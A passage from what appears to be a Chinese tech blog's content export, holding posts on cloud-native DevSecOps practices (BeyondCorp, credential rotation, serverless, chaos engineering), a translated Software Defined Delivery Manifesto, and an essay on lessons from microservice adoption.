数据库的？有点可惜。\n希望大家可以理解。你在做安全的时候，你会发现更多的安全问题是人为因素。因为我们技术上的保证尤其是在运维层面已经非常成熟了，你只要符合某个规范，把安全的点都考虑到，其实你运维端的安全就已经做得不错了。\n我们可能偏向于应用端的安全，应用端的安全有一个BSI，在你的整个应用开发周期里面考虑安全因素，你的应用有可能是你的安全最大的漏洞。但是你考虑这一点以后，你会发现DevOps不好串起来、也不好用，我们要考虑人的因素在DevOps体系里面是怎么样的。\n软件定义安全 #在座了解 BeyondCorp 的同学有吗？谷歌去年发表了一篇论文，这篇论文讲的是在未来的云环境下怎么定义安全。因为在云环境下要连接第三方服务和不同供应商之间就会更加复杂，它安不安全你是不知道的，它不安全会造成非常大的损失，它所能受到的是很大的影响。 这是一个模型，有相应的论文，后面我会把论文全篇发送给大家。他在里面讲到三个原则：\n第一个原则是所有网络都不可信，所有网络包括你自己的网络都是不可信的，比如在企业里面我的PC笔记本电脑和企业无线路由器连接的网络也是不可信的，你不要以为在企业里面有企业内网，电脑设备就一定安全了，这种情况下在 BeyondCorp 里面所有网络都是不可信的。\n第二是基于已知的用户和设备进行授权访问，如果网络是不可信的，你要访问资源一定要经过用户和设备进行授权访问。在座的有没有不知道是MFA多因子认证的？MFA是我们比较通用的一个实践，在如何确定你是你的问题上，这几个元素里面、这几个因子里面，你只要满足其中两个就可以证明你是你。\n第三个原则是对所有服务的访问必须进行身份验证，授权和加密。我们想到再做一个安全小调查，从用户的输入开始到最后存储数据库里面所有部分都进行加密的同学请举手，我们可能想到第一个问题是麻烦，第二个问题是可能有性能问题，现在加密技术的性能还是不错的，但是会有一些麻烦，而麻烦和应用性之间是有一个平衡的。在这里面我们在Beynod和Corp里面，为了保证数据安全性，我们一定要做身份授权和加密。\n另外一个是3R企业安全—云原生的安全，这是他们给的标题，我觉得这个非常不错。有没有听过3R企业安全的？这证明我的实践比较新，这也是去年的实践。什么叫3R呢？一是Rotate，经常更新用户的口令，每天都更新数据库密码的同学请举手？一天更新几次？\n这个做得不错，等一会儿我要介绍跟你一样的实践。二是Repave从0开始构建，每天从基础设施开始构建的同学请举手，我的网络和机器全部拆掉了，每天把应用重新构建一次，没有，我举手。三是Repair及时打补丁，这个我相信有同学做吧，每天做这个的举手，你们的运维做得非常不错，等一会儿解释一下。\n数据库流水线 #这是我们做的案例，没有人管理密码的数据库。大家可以看到，这是一个数据库用户常见分析结构，Root是数据库最大的权限。在所有的用户里面没有一个活着的人知道用户密码的，Root有下面所有的权限，包括有用户管理和配置管理的权限，以及下面所有的权限。 Power User是DDL语言，每一个都是针对我们数据库权限的访问，通过这种分层访问的方式来决定数据库里面的用户分配。我们应用访问数据库也会有一个用户，就是App User，目前是没有人知道密码的。我们首先会有权限架构，权限架构会扩大分配应用。\n我们的数据库是构建了一个流水线，前年有一个实践叫基础设施流水线，我们建立了一个数据库流水线。从左边到右边看，左边第一个配置是把PaaS平台的网络配置关于数据库的配置好，如果有变动就相当于重新建。 当然我们用了一些高可用的手段，让它的变动不那么大，我们会新建数据库，用PaaS平台数据库配置。数据库配置文件，建好数据库之后需要配置文件，当然数据库配置文件完成之后需要数据库重启。但是有些 PaaS 平台包括公有云不用重启，创建之后这两边就变成一块了，这是我说的数据库的基础设施。 这里左边是数据基础设施，右边是数据库实例，我们把这些全部放到流水线里面。而这两份除了最基本的创建用户、删减用户、增加用户名和密码之后，我们可能还有一些用户数据是由应用程序触发的，我们就会放到另外一条流水线里面。 这边完成之后会驱动这边。所以我们可以做到每天把数据库重新干了再恢复，中间会有一个差额，这个数额我们会通过打标志的方式迁移过来。 另外一种比较快的方式是数据库镜像，现在很多公有云数据库会做数据库镜像，很快就能还原出数据库实例。我知道在AWS上有一个没有服务器实例的数据库，大家有兴趣的可以尝试一下，当然中国区应该没有，是在国外的区域。\n没有人管理的密码数据库还有一点，就是我们的应用流水线。我们每次应用部署的时候都会更新访问应用的用户名密码。我们的方式是每次部署的时候创建一个新的用户，我们的用户名就是 app-user-version，每次部署的时候都会有新的用户，他的密码是自动随机生成的。每次生成密码的时候，按需可以随机创建新的基础设施，如果我的配置没有变更，他的变动是很小的，是秒级的，可能我点基础设施没有变动就快速过去了。\n另外一点，在这个基础设施上再部署新的应用，你会奇怪自动创建新用户的权限是哪里的。这个自动创建新用户的权限，我们会取得一个临时的权限，在创建完新用户之后取得一个权限，不是Root权限。\n创建权限之后再把它的权限回收，我创建完用户之后就把用户权限回收了，也就是说，保证我使用这个权限的时候，当场的情况下只有一次授权，谁都没有碰过任何用户名密码，因为我每次用户名密码都是自动随机生成的，只有应用程序自己知道密码是什么样的，这是我们每次部署都会更换密码的一个方式。 我们在以前创建应用数据中心的时候是从左边开始的，网络到应用程序我们都管，后面我们有云之后，到 IaaS 平台的时候，操作平台可能是 IaaS 平台给定的，上面是我们处理的。到了 PaaS 和 SaaS 之后有更多事情交给云环境，我们所需要写的程序越来越少。我前面说到，后 DevOps 时代你所需要管理的基础设施是越来越少的，但是管理基础设施的复杂度会越来越高。\nServerless First #什么叫做无服务器优先。就是我们在发布应用程序的时候制定以下原则，作为一个程序员，我希望:\n我写的代码直接部署到某个地方就可以运行(FaaS); 若1不可得，那就把我的运行时和代码一起打包直接部署运行。（利用Docker 或者 虚拟机镜像） 若2还是不行，那我希望能够把我需要的运行时在代码部署前自动化配置好。(Infrastructure as code) 若3再不可得，我希望能够有API支持我用代码配置环境。(API) 也就是说，当你开始写代码的时候，首先就要做好如何部署的准备。然后通过部署的方式来定义你的开发模型。在所有的部署方式里，Serverless 无疑是成本最低、稳定性最好的。之后的几条部署方式的稳定性则越来越弱。\n这里讲到CLI calls API，你做的事情是通过你的命令和API处理的。在座有没有用过AWS应用的，它会给你一个命令，AWS应用后面跟着服务、服务跟着操作，每个操作都可以通过CLI工具完成，这个东西是非常好编程的。而不是给你一大堆核心界面点来点去，那样的东西是非常不好管理的。\n这种面向资源的计算思维，每次CLI API都是异步的，性能上还会好一点。另外一点是在这种情况下你需要有全云端运维机制，知道你所对应的资源是不是完成你所要完成的工作，这就是一种方式。\n右边是国外比较通用的，左边是对应的产品。以前我们做应用性能测试的时候要买点做各种各样的事情，自己要开发、自己要找工具、自己要搭建。我们现在首先我们用这些运维工具，我们不再自己搭建了，我们在云端就用云端的服务，非常成熟。\n比如说查日志，我们看到很多ELK教程，很多人都把ELK搭建起来，但是现在已经不太用了，有从ELK调整到EFK的吗？我们已经不再用自己搭建的方式，而是买成熟实践和稳定实践的方式做这件事情。全云端运维，右边是国内对应的产品。\n全云端在线协作开发，AWS上的Cloud9被AWS收购的，我们的整个开发环境都是在云上的。你只要有一个浏览器，不需要在自己的配置上装安装包、装Java，虽然Java马上要收费了，我们未来可能不会再用Java了，我们会用全云端在线协作开发。\n国内也有同样的产品叫行云趣码，这个产品跟前面的Cloud9不一样，行云趣码产品可以接不同的云环境。你只要有任何的云环境，就可以在上面搭建这样的环境。所以你的开发人员入门使用这些东西的时间就会大大缩短，我打开浏览器就开发了，不用考虑语言冲突和各种SDK的麻烦。\n另外一个是FaaS应用，函数即服务。最早是 AWS Lambda，我两年前讲 AWS Lambda的时候还是一个很新的概念，这两年各种平台都已经出现了。你只写应用端的一些代码，剩下的都不需要管。\n之前用 serverless 框架可以很容易的集成到持续交付流水线里面，然后去运行 FaaS 服务。有了 FaaS 服务，还是你自己手工搭建数据的时代，现在有了更多 FaaS 平台。首先我们可以看 Pythonanywhere，作为一个程序员是很幸福的，因为你可以马上转变成大数据工程师。有了这个工具之后就可以快速的把 FaaS 部署到线上，直接成为一个应用，而不需要搭建环境。如果是私有云需要像前面搭建一些 Webtask 等，它就可以快速帮你生成。\n去中心化持续集成 #我们的去中心化持续集成没有持续集成服务器，集成怎么做？我可以给大家讲一下，这是我们做去中心化的持续集成步骤。第一是git push，git 有一个功能，在你提交Push命令之前可以增加一些代码做测试，这样就不用CI做测试。第二是代码提交门禁，采用单一主干提交，进行部署，部署后测试，最后是发布。\n在这个过程中，第一个是手工操作、第二个是手工操作，中间全部是自动化，也就是所有上线都是自动化，有什么集成测试，集成测试也是我应用的一种，直接上线进行部署后测试。\n我们在提交预测做一些单元测试的事情，但是切忌不要用分支，如果增加分支就给源代码和延迟提交的借口，所以单一主干提交，当然你的管理就会更麻烦。我们部署的时候直接是函数式微服务的部署，因为我只修改那一点就只部署那一点，最后是部署测试。\n如果微服务要测试之外，微服务直接跨服务的业务也需要测试，而这种功能测试也是端到端的应用。在这种情况下，我们是没有集成服务器的，因为你也不需要。\n有没有在座的同学提交代码之后直接上生产环境的?中间也不需要手工操作发布，直接发布到生产环境的有没有？厉害厉害，我们花了三年才做到这一步，中间主要是在测试这个地方花了很大的功夫。\n除了我们刚才的功能测试之外，我们还有 ATDD，ATDD 是验收测试驱动开发，大家可以了解一下。通过这种方式，我们可以把手工操作代码提交到生产环境下，增加信心和保证。因为你不会考虑到上去之后有什么问题，你能考虑的问题都用自动化测试的方式解决，当然也不能特别绝对。\n另外一点，小心采用 FaaS 的时候不要变成 Nano-Service。以前微服务是中间部分，FaaS 微服务可能会有更多函数。但是如果你的管理复杂性增高，可能你管理服务的复杂性，包括来回调用、相互依赖、事务处理更多，可能就会进入一种反模式，这种情况是需要避免的。\nChaos Engineering #这个有在用的吗？没有。这个实践后来叫做混乱工程，混乱工程是什么意思呢？混乱工程是它随机在计算机把你的几个实例下线或者服务搞坏，看你的服务是不是正常使用。基于这种方式，你可以用这种工具，在网上查混乱工程或者Chaos Engineering。\n这个要重点讲一下，首先我们假设这个系统是正常的。我们需要采用几个关键指标来定义“正常”。第二是假设这个正常的状态，你会把这个状态的所有服务器和实例拆成两个组，一个是控制组、一个是实验组。 第三是我们会引入一些反映真实世界的变量，比如说断电、攻击、负载过高之类的东西，硬盘故障、网络连接故障等干扰实验组，看最后的应用表现是不是一致的。如果实验组部分被这些因素扰动，它应该和你正常的部分行为是一致的。 如果它们两之间没有差异，就证明验证通过。如果它们之间有差异，反驳这个正常的假设并找到差异来修复应用系统。这就是通过找到不稳定的因素让它变得更稳定。这个测试你可以每天去做，也可以隔一段时间做一次，但是我建议每天去做，像我们以前做的每日可发布一样。\n另外在安全方面也是这样的，这个工具 ChaoSingr，目前很初级，大家可以记一下。这个工具目前只是涉及到 AWS，它是引入一些安全方面的变量，破坏安全控制和访问策略，看有没有入侵的可能性。它的理论和上面是一样的，假设我们的应用是安全的，然后来定义什么样是安全的，我们做了哪些措施保证安全。我们找出另外一组来，用一些安全方面的手段去除这些策略，看有没有其它手段保护住。\n总结 #我们在DevOps Cloud Native的实践有几个是比较重点的。第一是安全第一，从安全的角度设计 DevOps 流程和工具，而不是把安全引入到 DevOps 里面。另外一个是BeyondCorp、一个是 3R 企业安全，能够重建应用和基础设施，让入侵及时被处理掉，让它没有足够时间做这些事情。 第二是 Serverless First，当你开始用运维工具、开源工具开发应用的时候，尽可能要有AWS Lambda 方式，因为你需要维护的基础设施越少，你的应用弹性就会更好。最后是混乱工程 Chaos Engineering，让你云上包括私有云上的基础设施都在一个非常稳定的状态下做测试。我们架构的只有一点是最核心的，就是为你的失败可能出现的情况进行设计。\n","date":"March 17, 2019","permalink":"/blog/2019/2019-03-17-cloudnative-devsecops-practices/","section":"Blogs","summary":"","title":"云原生下的 DevSecOps 实践"},{"content":"原文链接：https://github.com/sdd-manifesto/manifesto 中文链接：https://github.com/wizardbyron/manifesto\n软件定义交付宣言（Software Defined Delivery Manifesto） #我们认识到, 提供有用的软件塑造了我们的世界。我们认识到，代码是指定精确操作的最佳方式。我们认识到, 只有在交付代码时, 代码才会有用。\n交付不是一个细节, 而是我们的工作。现在是将我们的核心技能应用到自己的工作中的时候了。现在是时候 工程化 我们的交付。我们在人类自身和计算机之间分配我们的工作: 人类用于决策, 而自动化用于任务。\n交付工作本质上是独特的。应用程序、组织、部署环境和团队的每个组合都有自己的上下文。我们认识到, 每个团队都需要理解这种独特性的交付和自动化。我们认识到, 虽然持续交付对于满足业务需求至关重要, 但自动化所有重复的任务非常重要。\n我们加快自动化的速度与加快应用程序开发的方式相同: 使用现代体系结构和编程语言以及用于通用能力的框架、库和服务。\n我们承认现有技术。这不是发明的工作, 而是表达的工作, 是及时和急需的方法的工作。\n交付基础设施现在是可编程的, 所以我们将对其进行编程。\n软件定义交付（Software Defined Delivery）是 #核心： 交付是每个软件团队和组织的基本和战略能力。\n一流的： 交付代码就是生产代码。 战略性： 决定团队和组织层面的政策;在代码中精确地实现它, 而无需辛劳。 演进： 随着我们的了解, 我们不断地改进我们的交付。 工程化的: 在可靠的、可测试的代码中。\n现代软件架构: 事件驱动并可扩展。 现代编程语言: 逻辑最好在代码中指定, 而不是在图片或 GUI 中指定。脚本不会扩张。 基于模型: 由软件领域的模型支持, 包含对代码的理解。 可测试: 允许部署在生产前进行较短的交付周期以发现错误。 进步: 随时促进部署。提供对受众群体和环境进行有控制、选择性的更改。允许是渐进和深思熟虑的发布。 协作:\n在人群中: 每个人都可以通过代码表达他们的专业知识, 以造福于每个人。 在软件中: 我们使用同类最佳的工具, 但我们对这些工具的组合是独一无二的。 在人群和软件中: 协作自动化增强了我们的感知, 并实现了我们的决策。它将信息和行动带到我们所处的位置, 并使自动化行为为我们所理解。通过代码, 我们区分团队的共享交付目标集和它们的实现。 加速:\n通过自动化: 我们自动执行重复的任务, 以加快我们的工作, 避免错误。 通过复用: 开发人员、团队和组织之间共享通用功能。 可观察的: 常见的方法是观察和排除作为生产系统的交付过程中发生的情况。\n跟踪: 观察系统中的活动并跟踪动作之间的关系。 调试: 与交付流程交互并审查。 指标: 从整个交付流程中的活动中派生指标。 作者：（按照姓名首字母排序）Kenny Bastani, Marc Holmes, Rod Johnson, Jessica Kerr, Mik Kersten, Russ Miles, Erin Schnabel, Matt Stine. 以及社区成员的帮助和整理。\n© 2018 版权归以上作者所有，本声明可以通过任何形式自由复制, 但只能通过本文进行全文复制。\n","date":"March 14, 2019","permalink":"/blog/2019/2019-03-14-sdd-manifesto/","section":"Blogs","summary":"","title":"【翻译】软件定义交付宣言"},{"content":"大部分微服务的案例，我们往往都只能看到一个结果，很难看到其过程，特别是实践中的弯路。让人有一种“采用就会成功的错觉”。经过前三篇的探讨，我们通过一个成功案例的三方面分析对微服务成功度量、技术演进和组织演进有了一个基本的认识。本文试着把我在客户身上看到微服务落地中那些经验和反思分享给大家。\n软件开发中的“灰犀牛事件” #“灰犀牛”是与“黑天鹅”相互补足的概念，“灰犀牛事件”是太过于常见以至于人们习以为常的风险，“黑天鹅事件”则是极其罕见的、出乎人们意料的风险。\n在产品研发的早期，特别是产品开始投入市场的时候，为了取得短期的高速增长所采用的临时方案。然而，虽然会有资深架构师或者程序员告诉你产品这样做不行。但作为决策层，它并未感到技术债带来的成本和风险（风险和成本的积累是需要时间反应的）。于是技术债就变成了一个“狼来了”的故事，而架构本身就变成了一个灰犀牛事件：\n我们从未切实的感到过应用架构崩溃所带来的成本，所以对技术风险选择性失明。\n然而，随着资本周转的速度越来越快，这些技术债务的利息会慢慢到期，变成一个又一个定时炸弹。于是应用的交接就变成了一个击鼓传花的游戏。越早构建的应用越能体会这样的痛：\n竞争对手的变更越来越频繁，如果不这样很难保持领先优势，因此你也需要更快的交付；\n应用质量使得应用交付没有办法快起来；\n为了避免质量问题，增加需要采用严格的流程和中间环节审查才能确认变更没有问题；\n为了采用严格的流程和中间环节审查，于是应用交付的流程越来越长，导致交付速度进一步变慢；\n由于应用交付的流程越来越长，限于交付截止日期。每个人都只关注自己所处的流程，而无法把控整体质量，导致质量进一步变差。\n于是，这就变成了一个悖论：你想让软件交付变快的手段只会导致它越来越慢。\n对于以上的问题，DevOps 给出了解决方案：通过精益（Lean）缩短流程，通过自动化（Automation）提高效率，通过度量（Measure）看到问题，通过分享/分担（Share）避免只见树木不见森林，通过文化（Culture）一系列的自律自治而非顶层设计产生的原则注入到组织里的每个人身上。这就是 DevOps 的 CLAMS 原则。\n然而，DevOps 并没有解决“规模”的问题，它所适用的场景对于“两个披萨”的团队来说如鱼得水。但那些超过“一百个披萨的团队”又应该怎么办？\n庆幸的是，在“规模化 DevOps” 出现之前，就有人意识到了 “DevOps 规模化”面对的问题，也避免了那些对“规模化 DevOps ” 避而不谈的尴尬。毕竟，“规模化敏捷”也正处在骑虎难下的境地之中。直到“微服务”吸引了大家的注意力。\n我们并没有看到那些技术债，因为工程师们正在承担着技术债的利息。我们也没有看到那些崩溃的应用，因为新的应用会取而代之。那些负责人呢？别担心，也总会有下一个。毕竟所有人都在闭着眼睛扶梯子，而且会有人对你说“你又没站在梯子上，何必认真呢？”\n直面风险：关注弹性而非确定性 # 风险管理的本质：不是让所有的风险都消失，而是确保风险发生时有相应的应对措施。 ——《人件》\n在打造稳定的应用系统上，人们往往倾向于提升应用系统预期结果的确定性，避免异常情况的出现，这就是让“风险都消失”。这实际上是灰犀牛问题的一种表现：我们选择的不去面对那些一定会发生的风险，而是一厢情愿的避免真实的问题发生。\n在这种观念下打造的应用系统会因为僵化而变得更加脆弱，使黑天鹅事件造成的影响更大。然而，如果我们把所有的风险都穷尽，解决这些问题则会花费过多的成本。\n我们可以通过事件发生的频率高低和影响大小，构造一个开发-运维事件矩阵。并且监控每个事件对系统造成的影响，如下图所示：\n根据上图，通过不断的度量，我们可以看到在微服务的过程中带来的变化。然后，我们可以根据各种事情的变化，构建出一个动态的、可自动恢复的弹性应用系统。\nChaos Engineering——\u0026ldquo;混沌工程\u0026quot;就是一种方法论，能够通过模拟真实发生的风险来验证你的自动化应对措施是否有效。\n组织结构上也存在同样的缺乏弹性问题，一个常见的风险就是人员的离职和流动，这是一个常常被忽视的且影响很大的风险。而一个错误的做法是极力挽留一个“重要的人”。\n如果一个人离开了造成的很大的影响，凸显出这个人重要性的同时也说明一个组织制度的不成熟。所以，我们要构建一个职责轮换的机制，提升这些事情低频率的发生，并通过组织自发的改进机制来降低它带来的影响。这是我所认为 Design For Failure 的意思：直面风险，而不是选择性失明。\n所以你得先看到那些高频率的影响大的事情。去制造它的发生，然后在不断的适应中让他不再那么痛苦。\n保持团队信息的极度透明 #微服务架构实施中一个常见的反模式就是组织和应用的“碎片化”：很多组织在拆分微服务之后，会安排独立的团队负责微服务，并以责任边界隔离代码和团队。\n这样会使团队之间从技术到组织流程进入了另一个“深井”。为了解决这个问题，就需要增加了更多的管理人员来解决这些问题。于是一个微服务后的组织被不断的“垫高”。\n按照《我们如何衡量一个微服务实施的成功》一文中的度量方式。如果在微服务改进中管理的长期成本提升，往往说明我们走错了路。微服务的实施不能带来信息的垄断和碎片化，反而要提升透明度和统一化。以下两点十分重要：\n打破信息的垄断，让所有团队的所有状态和信息——产品路线图、交付进度、运营状态等——对所有团队开放，而不是只存在几个人的手里。\n代码全民所有制：团队和微服务不应该是强绑定的关系，用任务类型取代角色。任何人都可以修改任何微服务的代码，每个人对自己的修改负责。\n按需拆分微服务 #很多企业已经在拐点到来之前开始进行微服务改造：引入 Docker、Kubernetes、Kafka……而对于真正的架构问题，大家避而不谈，三缄其口，只把一些时兴的工具祭奠成了玩具。但是，\n如果用技术去解决一个管理问题，要么你高估了技术带来的转变，要么你低估了管理问题的难度。\n微服务带来的第一个好处就是对风险的隔离：把稳定的部分和不稳定的部分隔离开来。\n这种隔离是两个方面的，一方面是一个应用系统运维部分和开发部分的隔离，把经常变动的业务逻辑和不经常变动的业务逻辑执行环境隔离。另一方面就是在应用内部隔离，把稳定的业务和不稳定的业务隔离。\n因为微服务本身就是把内部的复杂度，也就是应用内部的依赖。通过分布式工具转化为外部复杂度，也就是应用之间的依赖。所以，需要通过额外的基础设施来管理这些应用之间的依赖。 然而，这样的转换所带来的就是运维成本的上升。\n此外，从业务逻辑上“重新拆分”：为了便于理解，进行了更高层的抽象。划分成了“几大中心”，“几大模块”，“各司其职，分别治理”。这满足了决策层“重新画蛋糕”的变革诉求，也很想当然的降低的管理的难度。而习惯于“整体规划”的人往往会从高层设计一个“全局微服务架构”，然而这些设计难以落地，因为高层不理解底层实现。接下来的微服务就会不计成本的落地。一方面为了维护“架构师的尊严”，一方面为了“缩短时间成本”。然而，这些都美好的愿望、经常碰到几个问题：\n理想的架构和现实的架构差异很大，因为很多实现的问题在设计的时候并没有考虑；\n服务拆分后每人只关注自己的服务，缺失的服务间业务设计则需要增加管理层来弥补；\n自动化不足，需要更多的人员来解决工作量；\n急功近利面对太多的未知引发风险和成本的规模性增长；\n由于以上问题缺乏度量，微服务的改造进度处于“停滞”的状态。\n如果不对微服务采取度量，你的微服务改造往往是失控的。\n此外，并不是所有的应用都适合微服务架构。首先得明白微服务架构所解决的问题。而微服务面对的问题有一个常见的误解是遗留系统不断膨胀，使其内部复杂度达到一个不可维护规模，即：\n应用规模会增长到规模的增加边际收益为零为止。\n这可以说是经济学边际回报递减规律的一种应用。也就是说，无论你增加功能还是增加人手。当这种增长并不会带来收益的时候，它就已经到达极限了。然而，我们对这些指标并不度量，所以很多情况下这种成本是未知的。\n所以这种事情并不一定会发生，因为我们应用的增长规模并不显著。我们有足够长的交付周期和人员流动可以让这些问题变得不显著。\n只有系统集成的时候，特别是采用 ESB 进行系统集成的时候，这种突然陡增的规模才会引发规模性痛点。集成到一起的系统，同时也加倍集成了复杂度和风险。在这种集成下，交付周期和人员规模一下就变得严重短缺。我们并没有从深层次的角度去化简这种复杂性，而是通过增加人手来弥补这种短缺。直到无法继续招聘到合适的人为止。\n我们可以看到，我们从一种均衡（各自缓慢演进的独立系统），经过了规模化动荡（通过系统集成汇聚了风险和成本），通过增加维护人员，达到了另外一种均衡（更大规模的系统和组织）完成了增长。\n然而这种增长仍然会面临规模上限的挑战，直到而对资本回报率的要求会带来连锁性质的崩溃——不光财务债务到期，技术债务也到期了。缩小规模化成本最简单粗暴的形式——裁员以降低维护成本，而剩下的工程师工作量更大了。\n人们是不会砍掉系统功能来缩减维护成本的。毕竟，应用系统是对客户的承诺，承诺砍了，就意味收入砍了。所以这就带来了微服务拆分的第二件事：微服务是架构的重构，重构意味着不改变应用的行为，而对应用的内部组织进行优化。而这种优化所带来的好处是无法度量的。这就意味着如果投入人力，它的成本可能无限大。\n对于业务/IT 分离组织来说，没有业务价值的技术改造是没有预算的。这也就意味着我们不能用“休克疗法”——停止开发，开始改造。所以，微服务的拆分往往就是在开车的时候更换轮胎，伴随着新需求开发的同时进行应用的重构。\n而这时，我们要对新需求成本和微服务变更成本进行约束。根据新需求的预算限定新团队的大小，并通过团队的大小约束微服务的大小和规模。在新团队中采用新的代码库和环境以隔离对遗留系统的影响。采用“绞杀者”策略隔离新引入系统的风险。通过“修缮者”策略隔离遗留系统内部的风险。通过“拆迁者”策略替换掉那些不需要维护的代码以降低维护成本。\n在我介绍的案例里，我的客户用了 5 年把系统的微服务化推进到了 60% 到 70% 左右就不再继续了。因为微服务化的目的是降低开发运维产品的成本，而不是引入微服务。因此，我们在做新需求的同时兼顾了架构的演进。在不同的阶段采用了不同的策略，同时度量这些活动所带来的成本。如果不进行估算和度量，你的微服务改造一定会因为失控而面对更多的麻烦。\n所以，就像之前的文章提到的，做微服务的时候先不要急于你“是”一个微服务的架构。而应该在你的系统里先有一个微服务。然后看看这个微服务带来什么样的效果，做好各方面的度量，它的投入是什么？收益是什么？你需要花更多的成本管理中间的问题？而且你要面对一些不确定的风险？\n所以，如果你一开始做微服务的话，你可以考虑一下先成立一个小的微服务团队，然后感受一下。如果你已经做到深水区，你可以适当减缓速度，缩小规模。或者通过自动化提升效率和规范性。但第一要先做的，是做好度量。\n微服务的合并 #如果你看到上文发现自己的微服务改造下手太早了，或者已经停滞不前了，往往说明你进入了深水区。在这个阶段你开始度量，你会发现微服务的拆分并没有带来收益，反而增加了成本。具体表现为以下几个方面：\n基础设施没有规范化、自动化管理；\n强依赖被拆分了，需要额外的手段保证；\n拆分后质量更加难以把控，测试的难度增加了；\n微服务网络性能低下；\nAPI 网关成为了新的单点故障。\n当你出现了这几种情况，你所面对的可能是微服务的一个反模式——“毫服务”（Nano Service），这个反模式往往是因为在缺乏度量和风险约束的情况下进行拆分导致的。因此，过早拆分微服务是万恶之源。\n所以，当你开始度量，你会发现有些应用是不能拆分的。如果你已经拆分了，就要根据实际的度量，进行合并。我把“微服务的合并”看做是企业微服务化的一个成熟度标志，这标志着微服务拆分的度量体系形成。你开始考虑什么时候该拆，什么时候该合，也会理解影响拆合的因素。\n这些因素主要包括：组织责任边界、一致性、性能。\n我们曾经有一个子系统，它因为组织变动的关系，会在两三次的变动中划给不同的部门。划完之后我们微服务就是拆了合，合了又拆，拆到最后一次拆，前后拆合了 3 次。\n在做微服务拆合的时候心里要牢记康威定理：你的系统结构跟你的组织结构是一一对应的。这样，你就可以从宏观的角度发现问题，也知道哪些是在加速过程中难以逾越的“音障”。\n对于性能或者保证事务完整性做的合并，这往往是由于在设计的过程中没有考虑部署架构。你得理解，网络间的远程调用并不如一个进程内的程序上下文调用那么可靠和性能高。微服务拆分到分布式的环境中需要额外考虑网络的问题。\n因此，为了避免这些问题，提前了解并规划好部署结构是十分重要的。\n六边形架构 #我们习惯于采用分层的方式来描述架构：展现层、领域层、基础设施层、数据访问层，然后我们根据业务，采用垂直的方式进行切分。如下图所示：\n然而采用这种方式进行微服务架构的拆分都会落入一个陷阱：业务中的依赖会被忽视，直到代码拆分和服务间通信的时候才发现架构的错乱。那是因为分层架构展示的是技术层面的关系，通过分层架构我们是很难描述出业务层面的依赖性的。而业务的依赖性则是微服务拆分的核心：业务中决定了哪些部分是强依赖，哪些部分是弱依赖。\n然而，在大规模系统中，特别是集成后的大规模系统中，这些依赖的发现则更加困难。\n而采用六边形架构的方式，我们则更容易的看到业务之间的关系。\n图片来自：www.herbertograca.com\n“六边形架构”又被称之为“端口与适配器”模式。 六边形架构将系统分为内部（内部六边形）和外部，内部代表了应用的业务逻辑，外部代表应用的驱动逻辑、基础设施或其他应用。内部通过端口和外部系统通信，端口代表了一定协议，以 API 呈现。一个端口可能对应多个外部系统，不同的外部系统需要使用不同的适配器，适配器负责对协议进行转换。这样就使得应用程序能够以一致的方式被用户、程序、自动化测试、批处理脚本所驱动，并且，可以在与实际运行的设备和数据库相隔离的情况下开发和测试。\n在六边形架构中，业务是固定和稳定的。而实现则是可以替代和替换的。不同的六边形代表了不同的领域对象，各自可以成为一个独立的微服务。如果你可以用如果你能用六边形架构去画你的架构图，那么你离微服务已经不远了。它的耦合和技术实现相对清晰和稳定。\n对齐“统一语言（UBIQUITOUS LANGUAGE）” #实际上，微服务的架构需要考虑以下几个架构的相互匹配：\n组织架构：人员的管理层级架构；\n业务架构：根据人员管理层级带来的业务流转架构；\n应用架构：根据业务流转进行的应用程序逻辑划分架构；\n部署架构：将应用程序逻辑组织在分布式计算平台上的架构。\n在这四类架构中，1 和 2 都是非技术因素，但是决定了 3 和 4 的技术因素。这就是上文提到的“康威定律”的另一种表现形式。而工程师看待系统的角度和用户看待系统的角度是不同的。这很大一方面的原因是没有采用同一种方便两者相互理解和交互的语言进行对话。\n此外，不同的系统在集成时也需要对齐接口中所采用的语言和单词，否则同一个词语在不同的系统中有不同的解释，导致深层次的麻烦。\n在我之前提到的客户身上，发生了这样一件事情。他们系统包含了一个报价系统和一个核算系统。一个对内部使用，一个给外部使用。在国外，对于外部使用的系统来说，价格是含税的。而对于内部计算统计来说，报价是不含税的净收入。这个比率大概是在 10% 左右。然而，由于两个不同的系统都采用统一的单词 Price 来作为系统之间交换数据的字段。因此，系统就把内部的不含税价格暴露给了客户。当我们发现这个问题的时候，这个系统已经运行了三年。也就是说，这个系统在这三年里每年都损失了 10% 的收入帮客户缴税。\n整个过程是因为我们在帮这些系统增添自动化集成测试案例的时候，发现这个自动化测试失败了，然后就发现了两个系统之间价格的不一致性，虽然都是价格（Price），但一个含税，一个不含税。\n当你去和不同的系统进行集成的时候，你会发现对齐统一语言非常重要。这也是我们在做微服务架构的过程中会发现的一个问题。由于程序员不懂得业务，就会导致这样的问题。所以你需要有一个领域专家在不同的系统集成时对齐领域语言。\n后来，我们把“价格”这个单词在不同系统里用两个不同的单词来表示。这样我们就知道在进行价格计算的时候需要重新考虑它是否含税。然后，我们编写了一些自动化测试来保证计算正确。一旦税率修改了或者规则修改了，我们就知道在哪里去修改相应的业务逻辑。\n不要过早的开发出统一化的工具 #微服务本质上仍然是一个分布式系统，在拆分微服务的过程中，是用运维的代价去交换开发的代价。由于运维的相关内容比较稳定，因此进一步隔离了系统中的风险。\n如果我们把这一类运维问题看做一个独立的问题，我们也可以采用软件的方式来解决这个问题。很多组织，包括我所介绍案例中的客户，也开发了一套统一的工具来解决微服务的问题。\n但是，统一化的工具是一把双刃剑。作为程序员总是喜欢不断重复造轮子来自动化，然后就会做一些工具加快自己的工作效率。但是当你去做统一化的工具的时候，你会要求每一个团队都使用这个工具，就会造成新的依赖。\n而且，这个工具未必没有开源的成熟解决方案。如果你要开发一个工具，你需要投入一个人，甚至一个团队来维护它的时候，很可能就会进入“黄金锤”反模式。\n而在微服务化的初期，通用场景识别的很少的情况下，它的场景是有限的。一旦场景出现变化，统一化工具就会变成一个阻碍。到后面场景越来越复杂的时候你需要不断修改工具，保障向前兼容的同时还要向后兼容。你可能会发现你开发微服务的时间要远远小于你处理统一化工具问题的时间，你就要额外花费成本。\n我们的客户就开发了一个结合 AWS 发布 Docker 应用的生命周期管理工具以及对应的微服务模板。但是随着场景的增加，这个工具变得越来越复杂。很小的部署诉求都要增添很多无用的组件和配置。于是我把这个工具去掉，采用最简单的 AWS 原生方式来部署应用。\n如果你做了一个统一化工具，那你就把它开源推广。如果你做一个工具不去推广，你的工具会被其它成熟的开源工具取代，你的研发投入就浪费了。如果你开源效果好，说不定成为了业界的某一标准，就会有很多人帮助你来维护这些工具。\n我听说过某互联网电商大厂的一个故事：由于 Docker 